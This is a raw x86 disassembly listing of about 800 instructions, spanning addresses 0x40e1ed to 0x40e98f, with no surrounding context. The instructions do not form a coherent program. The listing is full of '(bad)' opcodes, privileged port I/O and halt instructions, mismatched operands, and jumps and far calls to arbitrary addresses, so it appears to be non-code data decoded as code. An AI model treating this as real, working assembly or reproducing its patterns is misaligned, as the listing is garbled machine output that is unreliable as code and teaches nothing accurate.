  40e1ed:	mov    gs,WORD PTR [ebp+edx*2-0x2e69e72f]
  40e1f4:	gs addr16 (bad) 
  40e1f7:	jb     0x40e1f6
  40e1f9:	cld    
  40e1fa:	mov    ah,0xd3
  40e1fc:	(bad)  
  40e1fd:	mov    ?,WORD PTR [eax+0x33]
  40e200:	or     ecx,DWORD PTR [eax]
  40e202:	retf   0xb0dc
  40e205:	mov    ebx,0x9297f8b8
  40e20a:	jbe    0x40e1a5
  40e20c:	inc    eax
  40e20d:	mov    edx,DWORD PTR [ebp-0x46489c4c]
  40e213:	jb     0x40e1fb
  40e215:	mov    ch,0x27
  40e217:	ss scas al,BYTE PTR es:[edi]
  40e219:	lock (bad) [ebp+0x75]
  40e21d:	xchg   DWORD PTR [ecx],edx
  40e21f:	shl    DWORD PTR [ebp+0x22],1
  40e222:	sub    ecx,DWORD PTR [ecx-0x6f6fbbe5]
  40e228:	and    BYTE PTR [bx],0x87
  40e22c:	mov    ebx,0x8fe21873
  40e231:	push   esp
  40e232:	mov    DWORD PTR [edx+0x5c83278f],esp
  40e238:	(bad)
  40e23c:	dec    esp
  40e23d:	pushf  
  40e23e:	mov    BYTE PTR [ecx+0x5b],bh
  40e241:	mov    edi,DWORD PTR ss:[edi-0x59]
  40e245:	je     0x40e2c3
  40e247:	je     0x40e1fe
  40e249:	es xor al,ch
  40e24c:	iret   
  40e24d:	xor    BYTE PTR [ebp-0x7c00ad05],0xaf
  40e254:	arpl   WORD PTR [edx-0x61030028],bx
  40e25a:	sbb    al,0x9a
  40e25c:	jne    0x40e1f1
  40e25e:	mov    ch,0x35
  40e260:	(bad)  [ecx]
  40e263:	imul   DWORD PTR [ebx+0x667ad47f]
  40e269:	sub    eax,0x23da4cb5
  40e26e:	xlat   BYTE PTR ds:[ebx]
  40e26f:	or     ebx,esi
  40e271:	or     ah,cl
  40e273:	nop
  40e274:	js     0x40e2eb
  40e276:	test   edx,ecx
  40e278:	je     0x40e21d
  40e27a:	mov    esi,0x55457566
  40e27f:	sbb    dh,BYTE PTR [ecx-0x205e2ccc]
  40e285:	(bad)  [eax]
  40e287:	(bad)  
  40e288:	repnz in al,dx
  40e28a:	add    BYTE PTR fs:[ebx-0x61],0xda
  40e28f:	(bad)  
  40e290:	je     0x40e2ff
  40e292:	lods   eax,DWORD PTR ds:[esi]
  40e293:	in     eax,dx
  40e294:	push   ebp
  40e295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e296:	js     0x40e2bb
  40e298:	sub    esi,DWORD PTR [edi-0x39]
  40e29b:	lahf   
  40e29c:	arpl   WORD PTR [eax],dx
  40e29e:	call   0x77782ec2
  40e2a3:	das    
  40e2a4:	rcl    DWORD PTR [ebx-0x6d],0x3a
  40e2a8:	popf   
  40e2a9:	or     eax,0xc3c3d0de
  40e2ae:	shl    DWORD PTR [ebx+0x54],cl
  40e2b1:	or     al,0xa7
  40e2b3:	sti    
  40e2b4:	mov    al,ds:0x74225a31
  40e2b9:	inc    esp
  40e2ba:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40e2bc:	enter  0x98e5,0x9e
  40e2c0:	in     eax,dx
  40e2c1:	add    ebp,DWORD PTR [esi-0x33]
  40e2c4:	cmp    al,0x26
  40e2c6:	mov    eax,DWORD PTR [ecx]
  40e2c8:	lock jno 0x40e288
  40e2cb:	call   0xb2896fb7
  40e2d0:	jmp    0x40e2b6
  40e2d2:	mov    ?,WORD PTR [ebp-0x8f33ee]
  40e2d8:	xchg   BYTE PTR [ebp-0x59348d29],dl
  40e2de:	push   ss
  40e2df:	jo     0x40e293
  40e2e1:	mov    ch,0xbf
  40e2e3:	jp     0x40e35f
  40e2e5:	jg     0x40e328
  40e2e7:	cwde   
  40e2e8:	sbb    al,0xa5
  40e2ea:	mov    edx,DWORD PTR [edx-0x568f9b5a]
  40e2f0:	in     al,dx
  40e2f1:	test   BYTE PTR [ecx],0x72
  40e2f4:	leave  
  40e2f5:	mov    WORD PTR [edx],ss
  40e2f7:	aas    
  40e2f8:	lahf   
  40e2f9:	sbb    DWORD PTR [ecx],ecx
  40e2fb:	pop    esi
  40e2fc:	xchg   ebx,eax
  40e2fd:	inc    ebp
  40e2fe:	js     0x40e2de
  40e300:	js     0x40e30a
  40e302:	pop    eax
  40e303:	mov    bl,0xe3
  40e305:	mov    DWORD PTR [edx],edi
  40e307:	mov    bl,0x5d
  40e309:	ret    0x262c
  40e30c:	loope  0x40e28f
  40e30e:	inc    ebp
  40e30f:	push   eax
  40e310:	push   ds
  40e311:	jne    0x40e2a7
  40e313:	inc    ecx
  40e314:	push   cs
  40e315:	jmp    0x3d9cf625
  40e31a:	imul   ebp,DWORD PTR [edi],0xd44b34c0
  40e320:	adc    al,BYTE PTR [ebp-0x4256974d]
  40e326:	jge    0x40e2fc
  40e328:	dec    eax
  40e329:	sub    eax,0xa604198d
  40e32e:	sahf   
  40e32f:	dec    esi
  40e330:	stos   BYTE PTR es:[edi],al
  40e331:	dec    eax
  40e332:	mov    dl,0xfb
  40e334:	xor    al,BYTE PTR [ecx-0x6e]
  40e337:	addr16 inc esp
  40e339:	add    eax,0x5fe367b0
  40e33e:	lods   eax,DWORD PTR gs:[esi]
  40e340:	mov    al,al
  40e342:	mov    ebx,0x5914f39d
  40e347:	scas   al,BYTE PTR es:[edi]
  40e348:	ss mov ebx,0xdf724056
  40e34e:	and    dh,BYTE PTR [ebp-0x3bbecc97]
  40e354:	mov    al,0xe8
  40e356:	pop    es
  40e357:	dec    edi
  40e358:	pop    es
  40e359:	pop    edi
  40e35a:	jmp    0x40e36d
  40e35c:	shl    BYTE PTR [ebx-0x7f],1
  40e35f:	pop    edi
  40e360:	push   ds
  40e361:	and    edi,0x6a
  40e364:	pop    ebx
  40e365:	cmp    al,0x9d
  40e367:	not    ebx
  40e369:	sub    ebx,0xb3529438
  40e36f:	dec    edi
  40e370:	xchg   edi,eax
  40e371:	pop    edi
  40e372:	retf   
  40e373:	cmp    bl,BYTE PTR [esi+0x7aef40b2]
  40e379:	mov    ah,BYTE PTR [edx-0x43]
  40e37c:	and    eax,0x66d3fbcf
  40e381:	sbb    dl,BYTE PTR [edi-0x12]
  40e384:	xor    esi,esp
  40e386:	mov    edx,0xa95262ab
  40e38b:	cwde   
  40e38c:	in     eax,dx
  40e38d:	sbb    edx,0xe09ae376
  40e393:	add    BYTE PTR [edi-0x5da6965],al
  40e399:	push   ebp
  40e39a:	and    BYTE PTR [edi+0x3a065e93],al
  40e3a0:	sbb    al,0xa9
  40e3a2:	adc    al,0xcc
  40e3a4:	xchg   edi,eax
  40e3a5:	add    dl,dl
  40e3a7:	mov    ss,WORD PTR [esi]
  40e3a9:	scas   al,BYTE PTR es:[edi]
  40e3aa:	jg     0x40e3b8
  40e3ac:	mov    ch,0xc9
  40e3ae:	(bad)  
  40e3af:	xchg   esp,eax
  40e3b0:	int3   
  40e3b1:	ret    0x6048
  40e3b4:	push   ebx
  40e3b5:	or     al,0x8a
  40e3b7:	inc    esi
  40e3b8:	les    ebx,FWORD PTR [edx]
  40e3ba:	fsub   DWORD PTR [ebx]
  40e3bc:	imul   esi,DWORD PTR [ecx+0x12b15231],0xa5b6882a
  40e3c6:	add    DWORD PTR [edi],ebx
  40e3c8:	or     eax,0xdd8816d3
  40e3cd:	in     al,dx
  40e3ce:	and    edi,eax
  40e3d0:	(bad)  
  40e3d1:	fdiv   st,st(2)
  40e3d3:	inc    esp
  40e3d4:	and    al,0x72
  40e3d6:	dec    edx
  40e3d7:	sub    ah,al
  40e3d9:	sar    DWORD PTR [esi+0x62],cl
  40e3dc:	xchg   esp,eax
  40e3dd:	jnp    0x40e361
  40e3df:	adc    al,0x94
  40e3e1:	lea    edx,[ecx]
  40e3e3:	mov    bh,0xd
  40e3e5:	addr16 adc ebp,ebp
  40e3e8:	mov    al,0x25
  40e3ea:	popf   
  40e3eb:	nop
  40e3ec:	ins    BYTE PTR es:[edi],dx
  40e3ed:	and    BYTE PTR [edx+0xa7b4413],al
  40e3f3:	int    0xd4
  40e3f5:	out    0x17,al
  40e3f7:	jg     0x40e397
  40e3f9:	jmp    0xf8c0:0x91c94829
  40e400:	add    ebx,DWORD PTR [eax-0x1a976112]
  40e406:	sbb    DWORD PTR [eax],edi
  40e408:	into   
  40e409:	push   eax
  40e40a:	fiadd  DWORD PTR [ebp-0x65e45b9e]
  40e410:	cdq    
  40e411:	jg     0x40e46d
  40e413:	mov    ds:0x1e49278c,al
  40e418:	aaa    
  40e419:	xchg   edi,eax
  40e41a:	loopne 0x40e3c1
  40e41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e41d:	repnz (bad) 
  40e41f:	loopne 0x40e42a
  40e421:	and    eax,edi
  40e423:	mov    esp,0x7bbc84da
  40e428:	pushf  
  40e429:	mov    bh,BYTE PTR [esi+ebp*2]
  40e42c:	pop    esi
  40e42d:	or     ah,0x8f
  40e430:	and    DWORD PTR [edi+eax*2-0x34],edx
  40e434:	or     edi,DWORD PTR [ecx+0x60e3e895]
  40e43a:	(bad)  
  40e43b:	cwde   
  40e43c:	inc    ecx
  40e43d:	pop    ebx
  40e43e:	ds ret 0x2345
  40e442:	ret    0xa9a8
  40e445:	mov    WORD PTR [eax-0x81cf0d1],ds
  40e44b:	jb     0x40e4b2
  40e44d:	cmc    
  40e44e:	cmc    
  40e44f:	add    al,0xcf
  40e451:	stc    
  40e452:	xchg   DWORD PTR [edx-0x1a],ecx
  40e455:	pop    ds
  40e456:	mov    ch,0xc9
  40e458:	or     al,0x1
  40e45a:	ss xor eax,0xbf14cd38
  40e460:	sub    ch,ch
  40e462:	rcl    DWORD PTR [edi+0x67],0xd7
  40e466:	(bad)
  40e469:	add    eax,DWORD PTR [esp+edi*8-0x2cbade24]
  40e470:	loope  0x40e454
  40e472:	not    BYTE PTR [eax]
  40e474:	xchg   ecx,eax
  40e475:	sbb    eax,0x59be63e7
  40e47a:	sti    
  40e47b:	xor    dl,bh
  40e47d:	shl    DWORD PTR [ecx+0x0],1
  40e480:	(bad)  [ecx]
  40e482:	ins    DWORD PTR es:[edi],dx
  40e483:	dec    ecx
  40e484:	dec    ebp
  40e485:	fwait
  40e486:	mov    edx,0x5344db5a
  40e48b:	mov    ch,0xf9
  40e48d:	pop    edi
  40e48e:	adc    dl,bh
  40e490:	or     eax,0x5a4e95a2
  40e495:	jecxz  0x40e4b8
  40e497:	test   bl,dh
  40e499:	(bad)  
  40e49a:	call   0xa2aa:0x9f4842ed
  40e4a1:	adc    BYTE PTR [ecx+edx*8+0x72],bl
  40e4a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4a6:	jmp    0x5c6230dd
  40e4ab:	sub    BYTE PTR [ebx+0x5b55433a],ah
  40e4b1:	call   FWORD PTR [esi-0x51cbd24c]
  40e4b7:	mov    BYTE PTR [edx],ah
  40e4b9:	fdiv   QWORD PTR [ecx]
  40e4bb:	add    eax,edi
  40e4bd:	push   ss
  40e4be:	loop   0x40e531
  40e4c0:	and    al,0x22
  40e4c2:	pop    eax
  40e4c3:	jge    0x40e475
  40e4c5:	adc    DWORD PTR [ecx-0x5f],0xcf4f762e
  40e4cc:	pop    ebx
  40e4cd:	out    dx,al
  40e4ce:	and    ah,cl
  40e4d0:	ror    al,0x12
  40e4d3:	xchg   ebx,eax
  40e4d4:	pushf  
  40e4d5:	jns    0x40e45c
  40e4d7:	cmc    
  40e4d8:	or     DWORD PTR [ecx],edi
  40e4da:	jl     0x40e554
  40e4dc:	call   0x6c63cc69
  40e4e1:	aam    0xc9
  40e4e3:	dec    ebp
  40e4e4:	stos   BYTE PTR es:[edi],al
  40e4e5:	mov    bh,0x4a
  40e4e7:	cmp    bl,BYTE PTR ds:0xd6085553
  40e4ed:	imul   ebp,DWORD PTR [ecx+0x10],0x8a2fbb9
  40e4f4:	retf   0xba9a
  40e4f7:	fcomp  QWORD PTR ds:0xf8c23cfe
  40e4fd:	fcmovnb st,st(0)
  40e4ff:	loope  0x40e559
  40e501:	inc    ebx
  40e502:	bound  ecx,QWORD PTR [ecx]
  40e504:	pop    ss
  40e505:	sub    dh,BYTE PTR [edx+0x2588d25]
  40e50b:	loop   0x40e4a7
  40e50d:	xchg   ecx,eax
  40e50e:	jbe    0x40e4b4
  40e510:	or     bh,ah
  40e512:	sub    eax,0x165cea00
  40e517:	ds addr16 test al,0x71
  40e51b:	imul   ecx,edx,0xb66da3ab
  40e521:	add    esp,eax
  40e523:	dec    ebp
  40e524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e525:	fnstenv [ebp-0x11439e4e]
  40e52b:	test   BYTE PTR [ecx+0x37354f0b],dh
  40e531:	gs fwait
  40e533:	shr    DWORD PTR [esi],0x8
  40e536:	or     BYTE PTR [esi+0x2c],dl
  40e539:	push   ebx
  40e53a:	mov    al,ds:0xda8c5461
  40e53f:	fwait
  40e540:	test   eax,0x30e06eea
  40e545:	pop    edi
  40e546:	jp     0x40e5b7
  40e548:	fidivr WORD PTR [edx]
  40e54a:	sbb    DWORD PTR [ecx+0x4f22de77],0x15f5553e
  40e554:	sahf   
  40e555:	imul   edi,DWORD PTR [edx],0xede4ba31
  40e55b:	push   ss
  40e55c:	add    esp,DWORD PTR [edi]
  40e55e:	or     dh,0x1f
  40e561:	adc    bl,BYTE PTR [ecx+0x71]
  40e564:	xor    ah,dl
  40e566:	inc    esi
  40e567:	ret    0x5ae0
  40e56a:	out    0x29,eax
  40e56c:	in     al,0x4f
  40e56e:	popf   
  40e56f:	rol    BYTE PTR [edi],cl
  40e571:	std    
  40e572:	stos   BYTE PTR es:[edi],al
  40e573:	in     eax,0xda
  40e575:	inc    esi
  40e576:	sbb    BYTE PTR [edx-0x38],ah
  40e579:	xchg   ebp,eax
  40e57a:	loope  0x40e55a
  40e57c:	test   eax,0x6ea28665
  40e581:	lds    ebx,FWORD PTR [esi-0x51]
  40e584:	lods   al,BYTE PTR ds:[esi]
  40e585:	mov    ebx,0xff50a3e7
  40e58a:	or     BYTE PTR ss:[eax+0x1b],dh
  40e58e:	sbb    eax,0x7d2e5526
  40e593:	aam    0xc8
  40e595:	pop    ebp
  40e596:	daa    
  40e597:	jae    0x40e5c0
  40e599:	xor    eax,0x1860be21
  40e59e:	push   eax
  40e59f:	inc    ebx
  40e5a0:	mov    cl,0x5f
  40e5a2:	jae    0x40e588
  40e5a4:	inc    esi
  40e5a5:	sub    ebx,ecx
  40e5a7:	shl    DWORD PTR [edi+0xa],0x4d
  40e5ab:	mov    fs,WORD PTR [esi+0x79]
  40e5ae:	and    edx,eax
  40e5b0:	pop    ebp
  40e5b1:	sbb    eax,0x6ac0e63a
  40e5b6:	sbb    eax,0x69b7365c
  40e5bb:	pop    ecx
  40e5bc:	mov    dh,BYTE PTR [edi-0x387015e9]
  40e5c2:	xchg   ebx,eax
  40e5c3:	sub    cl,dl
  40e5c5:	aad    0xcb
  40e5c7:	sahf   
  40e5c8:	or     edi,DWORD PTR [ecx-0x20]
  40e5cb:	hlt    
  40e5cc:	jle    0x40e5b6
  40e5ce:	(bad)  
  40e5cf:	sahf   
  40e5d0:	add    bh,dh
  40e5d2:	popf   
  40e5d3:	(bad)  
  40e5d4:	sub    al,BYTE PTR [esi-0x254461ab]
  40e5da:	and    al,0xd7
  40e5dc:	in     eax,0xd4
  40e5de:	inc    ebx
  40e5df:	dec    ecx
  40e5e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e1:	retf   
  40e5e2:	inc    edx
  40e5e3:	iret   
  40e5e4:	pushf  
  40e5e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e6:	cmp    eax,0x2bde9450
  40e5eb:	mov    edi,0x94f5d892
  40e5f0:	push   es
  40e5f1:	dec    ebp
  40e5f2:	mov    cl,0x79
  40e5f4:	dec    ebp
  40e5f5:	pop    eax
  40e5f6:	sbb    eax,0x6e9bd800
  40e5fb:	cmp    bl,al
  40e5fd:	dec    ecx
  40e5fe:	out    0xb7,eax
  40e600:	sbb    DWORD PTR [edx],ebp
  40e602:	ror    DWORD PTR [esi+0x7c],1
  40e605:	rcl    BYTE PTR [eax+0x5baeba1d],0x66
  40e60c:	adc    eax,0xbe21252c
  40e611:	repz cmp al,BYTE PTR ds:0xcb95b035
  40e618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e619:	push   0x93120eca
  40e61e:	sar    DWORD PTR [ecx],cl
  40e620:	(bad)  [ebp-0x17]
  40e623:	ds dec edx
  40e625:	pop    eax
  40e626:	xlat   BYTE PTR ds:[ebx]
  40e627:	cmc    
  40e628:	mov    edi,0x3ea28cc8
  40e62d:	xor    edi,ecx
  40e62f:	shr    eax,cl
  40e631:	pop    ebp
  40e632:	jne    0x40e64f
  40e634:	in     al,0x22
  40e636:	ja     0x40e63e
  40e638:	out    0xbd,al
  40e63a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e63b:	lea    eax,[ebx-0x5f]
  40e63e:	mov    ecx,0xc1ce272e
  40e643:	out    dx,eax
  40e644:	aad    0x32
  40e646:	cli    
  40e647:	jge    0x40e5cc
  40e649:	mov    bl,0xe3
  40e64b:	ret    
  40e64c:	lahf   
  40e64d:	int    0xf8
  40e64f:	mov    fs,WORD PTR [edi-0x7d9c1d1e]
  40e655:	dec    esi
  40e656:	adc    al,0x53
  40e658:	aad    0x81
  40e65a:	test   eax,0xff2bdbab
  40e65f:	ja     0x40e658
  40e661:	jb     0x40e623
  40e663:	xor    ebp,esp
  40e665:	lds    edi,FWORD PTR [ebx]
  40e667:	dec    edx
  40e668:	test   eax,0x2bbd852a
  40e66d:	xor    BYTE PTR [edi+0x26],ch
  40e670:	in     al,dx
  40e671:	xchg   esp,eax
  40e672:	push   ds
  40e673:	fistp  QWORD PTR [eax+0x6d]
  40e676:	jmp    0x1297bc79
  40e67b:	cmp    esi,ebx
  40e67d:	cmc    
  40e67e:	jnp    0x40e622
  40e680:	lds    edx,FWORD PTR [edi-0x51]
  40e683:	push   ss
  40e684:	jmp    0x1a65657c
  40e689:	cmp    DWORD PTR [ebx+0x39],ecx
  40e68c:	mov    cl,0x9f
  40e68e:	ret    0xfc2c
  40e691:	mov    dl,0xcb
  40e693:	rcr    BYTE PTR [edx-0x4ef076d1],cl
  40e699:	push   edx
  40e69a:	push   0xa6401d51
  40e69f:	shr    eax,0x3d
  40e6a2:	jp     0x40e6c2
  40e6a4:	out    0xd,eax
  40e6a6:	add    DWORD PTR [esp+ebp*1-0x46],esp
  40e6aa:	loopne 0x40e6e6
  40e6ac:	stos   DWORD PTR es:[edi],eax
  40e6ad:	mov    edi,0xfc4b633a
  40e6b2:	inc    esp
  40e6b3:	pop    ds
  40e6b4:	call   0x44d5aa5c
  40e6b9:	add    esi,DWORD PTR [ebx+0x4b]
  40e6bc:	dec    ebx
  40e6bd:	not    eax
  40e6bf:	icebp  
  40e6c0:	push   ebp
  40e6c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6c2:	and    al,0x8e
  40e6c4:	bnd jns 0x40e713
  40e6c7:	xchg   ecx,eax
  40e6c8:	push   ebp
  40e6c9:	or     eax,DWORD PTR [eax+0x22]
  40e6cc:	push   ebp
  40e6cd:	or     DWORD PTR [eax-0x679e0387],ebx
  40e6d3:	pop    esp
  40e6d4:	mov    edx,0xac53dc8d
  40e6d9:	mov    ebx,0xc993a4
  40e6de:	jp     0x40e693
  40e6e0:	lea    ebp,[ecx+0x1f854b95]
  40e6e6:	inc    edx
  40e6e7:	cmp    DWORD PTR [edx+0x31],eax
  40e6ea:	inc    edx
  40e6eb:	fwait
  40e6ec:	lods   al,BYTE PTR ds:[esi]
  40e6ed:	jb     0x40e6c9
  40e6ef:	test   al,ah
  40e6f1:	imul   esp,DWORD PTR [ebx+0x5d],0x38ea3d8
  40e6f8:	shr    dl,0x8f
  40e6fb:	repnz dec ebp
  40e6fd:	mov    eax,ds:0x6f7d9e82
  40e702:	sub    esp,DWORD PTR [eax-0x39bb5590]
  40e708:	mov    dl,BYTE PTR [edx+0x2d74a79c]
  40e70e:	push   esi
  40e70f:	daa    
  40e710:	cld    
  40e711:	mov    dl,0x38
  40e713:	xchg   BYTE PTR [ebx],cl
  40e715:	push   es
  40e716:	enter  0xc869,0xbd
  40e71a:	sub    DWORD PTR [edx+edx*8-0x52109015],eax
  40e721:	push   eax
  40e722:	push   ebp
  40e723:	js     0x40e751
  40e725:	and    BYTE PTR [eax+ecx*4+0x55],0xe5
  40e72a:	jbe    0x40e753
  40e72c:	fild   WORD PTR ds:0xc3e7b8f4
  40e732:	leave  
  40e733:	push   ebp
  40e734:	pop    ss
  40e735:	daa    
  40e736:	rol    DWORD PTR [eax],0x22
  40e739:	jno    0x40e73a
  40e73b:	icebp  
  40e73c:	sahf   
  40e73d:	add    al,0x3d
  40e73f:	(bad)  
  40e741:	xor    ebx,edx
  40e743:	adc    edi,DWORD PTR ds:[edx]
  40e746:	xchg   ebx,eax
  40e747:	in     al,0x37
  40e749:	clc    
  40e74a:	rol    BYTE PTR [edx],cl
  40e74c:	stos   DWORD PTR es:[edi],eax
  40e74d:	mov    ch,0x89
  40e74f:	sahf   
  40e750:	fimul  WORD PTR [edi]
  40e752:	pop    ecx
  40e753:	outs   dx,DWORD PTR ds:[esi]
  40e754:	pop    es
  40e755:	mov    eax,ds:0x42dd5760
  40e75a:	add    DWORD PTR [ebx+eiz*8+0x7b024ef7],edx
  40e761:	outs   dx,DWORD PTR ds:[esi]
  40e762:	add    al,0xf4
  40e764:	or     DWORD PTR cs:[ebx-0x32],eax
  40e768:	fbld   TBYTE PTR [ebp+0x18d7cf8b]
  40e76e:	push   ecx
  40e76f:	jne    0x40e794
  40e771:	mov    edi,0xac8c1327
  40e776:	dec    eax
  40e777:	adc    eax,0x266abf01
  40e77c:	jg     0x40e774
  40e77e:	inc    ecx
  40e77f:	daa    
  40e780:	cs xchg ebx,edi
  40e783:	add    al,0xa9
  40e785:	sub    eax,0x2d97e317
  40e78a:	dec    esi
  40e78b:	xor    ebx,DWORD PTR [ebx+0x38d147dc]
  40e791:	jle    0x40e80c
  40e793:	gs dec edx
  40e795:	mov    eax,0xecf2c548
  40e79a:	mov    ah,0x1b
  40e79c:	jnp    0x40e7ba
  40e79e:	addr16 sub eax,ecx
  40e7a1:	pop    esi
  40e7a2:	jno    0x40e72c
  40e7a4:	aam    0x42
  40e7a6:	je     0x40e768
  40e7a8:	jo     0x40e7dd
  40e7aa:	icebp  
  40e7ab:	inc    ebp
  40e7ac:	scas   al,BYTE PTR es:[edi]
  40e7ad:	pop    ebp
  40e7ae:	fistp  WORD PTR [esi-0x7d]
  40e7b1:	xor    dh,ch
  40e7b3:	and    eax,0xeee640a1
  40e7b8:	test   BYTE PTR [ebx+0x76ef9006],cl
  40e7be:	les    ebp,FWORD PTR [eax*1+0x48d7f461]
  40e7c5:	dec    esi
  40e7c6:	out    0xbe,eax
  40e7c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7c9:	mov    eax,0xafd312b9
  40e7ce:	pop    edx
  40e7cf:	int    0x95
  40e7d1:	and    BYTE PTR [edx-0x1a56f627],0xa7
  40e7d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7d9:	fwait
  40e7da:	ins    BYTE PTR es:[edi],dx
  40e7db:	repnz inc ebp
  40e7dd:	inc    ebx
  40e7de:	sbb    al,0x5b
  40e7e0:	sub    eax,0x4d2b56c
  40e7e5:	ror    DWORD PTR [eax],1
  40e7e7:	sub    al,0x95
  40e7e9:	(bad)  
  40e7ea:	xor    eax,0x905cd399
  40e7ef:	dec    ebx
  40e7f0:	cmp    BYTE PTR [esi],ah
  40e7f2:	ret    
  40e7f3:	icebp  
  40e7f4:	sub    DWORD PTR [edi+0x7cb2c654],0x8d1a845
  40e7fe:	pop    ss
  40e7ff:	cwde   
  40e800:	adc    al,BYTE PTR [edx-0x149ab689]
  40e806:	mov    bl,BYTE PTR [ecx+0x65]
  40e809:	in     eax,0x9
  40e80b:	sar    DWORD PTR [edi-0x4e953575],1
  40e811:	fist   DWORD PTR [ebx-0x4d856c82]
  40e817:	icebp  
  40e818:	dec    ecx
  40e819:	sub    eax,ebp
  40e81b:	dec    esp
  40e81c:	hlt    
  40e81d:	cld    
  40e81e:	mov    esp,0x9ffe4581
  40e823:	mov    ebp,0x64f1b870
  40e828:	ror    BYTE PTR [ecx-0x1e],cl
  40e82b:	ins    DWORD PTR es:[edi],dx
  40e82c:	xor    DWORD PTR [ebx+0x790d712a],ebx
  40e832:	xor    ebp,DWORD PTR [eax]
  40e834:	in     al,0x1c
  40e836:	imul   BYTE PTR [edi]
  40e838:	mov    dh,0x81
  40e83a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e83b:	mov    ch,0x84
  40e83d:	(bad)  
  40e83f:	bound  ebx,QWORD PTR [esi-0x6f]
  40e842:	xchg   esp,eax
  40e843:	cwde   
  40e844:	and    dh,0xeb
  40e847:	sahf   
  40e848:	jmp    FWORD PTR [edi-0x438f1c56]
  40e84e:	popa   
  40e84f:	inc    ecx
  40e850:	or     al,0x60
  40e852:	fmul   st,st(6)
  40e854:	idiv   DWORD PTR ds:0x27136ec0
  40e85a:	mov    dl,0x7
  40e85c:	adc    al,0x1
  40e85e:	out    0xa6,al
  40e860:	sub    ecx,DWORD PTR [ebp-0x3c]
  40e863:	(bad)  
  40e864:	js     0x40e875
  40e866:	ds call 0x39c4206d
  40e86c:	mov    bl,0xd
  40e86e:	mov    DWORD PTR [edx+0x1c],ebx
  40e871:	int    0xff
  40e873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e874:	adc    DWORD PTR [ebx+eiz*2+0xe9516f6],eax
  40e87b:	addr16 add bl,cl
  40e87e:	lods   eax,DWORD PTR ds:[esi]
  40e87f:	pop    ebx
  40e880:	fdiv   st,st(7)
  40e882:	mov    WORD PTR [ebx+0x19],ds
  40e885:	ror    DWORD PTR ds:0x8ac88b63,cl
  40e88b:	pop    ds
  40e88c:	rol    BYTE PTR [edi+0xc93edb4],1
  40e892:	shr    DWORD PTR [edx+0x54],0xb7
  40e896:	fild   WORD PTR [ebx+0xf]
  40e899:	(bad)  
  40e89a:	mov    ch,0x76
  40e89c:	sar    BYTE PTR cs:[edx+0x47],1
  40e8a0:	pop    ds
  40e8a1:	stos   DWORD PTR es:[edi],eax
  40e8a2:	mov    ebp,0xcd0c9fc0
  40e8a7:	jno    0x40e84c
  40e8a9:	retf   0x216c
  40e8ac:	(bad)  
  40e8ad:	cld    
  40e8ae:	mov    eax,0x9736d00d
  40e8b3:	(bad)  [ebx-0x2e]
  40e8b6:	lods   al,BYTE PTR ds:[esi]
  40e8b7:	fs sahf 
  40e8b9:	adc    edx,esi
  40e8bb:	sub    dh,BYTE PTR gs:[esi-0x71df6888]
  40e8c2:	add    eax,0xdafed0b2
  40e8c7:	mov    esi,0x5ea7ddd
  40e8cc:	mov    eax,0x1b37abc2
  40e8d1:	not    DWORD PTR [ebp-0x25]
  40e8d4:	fnsave gs:[ebx-0x44]
  40e8d8:	jge    0x40e8b1
  40e8da:	mov    bh,0x6f
  40e8dc:	jecxz  0x40e8c7
  40e8de:	mov    eax,0x82281497
  40e8e3:	fcmovnu st,st(4)
  40e8e5:	xor    dh,bl
  40e8e7:	fcomp  st(2)
  40e8e9:	shr    BYTE PTR [esi+0x223106ef],cl
  40e8ef:	inc    edx
  40e8f0:	std    
  40e8f1:	fcomp  DWORD PTR [edi-0x6a1f0f56]
  40e8f7:	fidiv  DWORD PTR [eax-0x49]
  40e8fa:	mov    esp,eax
  40e8fc:	daa    
  40e8fd:	push   esp
  40e8fe:	pushf  
  40e8ff:	sbb    DWORD PTR [ebp+0x6199e57e],edi
  40e905:	test   ebx,0xb7fe814a
  40e90b:	mov    esi,0xca2d6268
  40e911:	popa   
  40e912:	inc    eax
  40e913:	mov    ds:0x32a953b6,eax
  40e918:	mov    ebp,DWORD PTR [eax+0x62286f72]
  40e91e:	mov    ebp,0x472f580a
  40e923:	ret    0x9324
  40e926:	fwait
  40e927:	push   cs
  40e928:	dec    eax
  40e929:	mov    al,ds:0xbc838a6d
  40e92e:	ror    DWORD PTR [ebx+0x786a99fc],cl
  40e934:	mov    dh,0xce
  40e936:	add    al,0x3f
  40e938:	dec    ebp
  40e939:	adc    eax,DWORD PTR [esi-0x4b]
  40e93c:	fldenv [edx-0x48]
  40e93f:	imul   ah
  40e941:	jnp    0x40e9bb
  40e943:	or     al,0x8a
  40e945:	and    bl,al
  40e947:	inc    esp
  40e948:	sub    ebp,DWORD PTR [edx-0x142e3385]
  40e94e:	pop    ds
  40e94f:	js     0x40e92c
  40e951:	inc    ebp
  40e952:	mov    cl,0x40
  40e954:	(bad)  [edx]
  40e956:	xchg   ebx,eax
  40e957:	xor    eax,0x15984830
  40e95c:	xor    DWORD PTR [esi+ebx*4],0x3
  40e960:	pop    ebp
  40e961:	cwde   
  40e962:	out    0x4b,al
  40e964:	cmp    al,ch
  40e966:	in     eax,0x27
  40e968:	inc    ebp
  40e969:	push   ecx
  40e96a:	(bad)  
  40e96c:	jp     0x40e936
  40e96e:	jb     0x40e9bd
  40e970:	dec    eax
  40e971:	or     cl,0xc7
  40e974:	pushf  
  40e975:	cdq    
  40e976:	cmp    al,0xb2
  40e978:	jae    0x40e98e
  40e97a:	mov    al,0xc1
  40e97c:	not    edx
  40e97e:	test   BYTE PTR [esi],ah
  40e980:	inc    esi
  40e981:	shr    ebx,cl
  40e983:	imul   ecx,DWORD PTR ds:0xcd1d6e0,0x89dffd35
  40e98d:	in     ax,dx
  40e98f:	push   edi
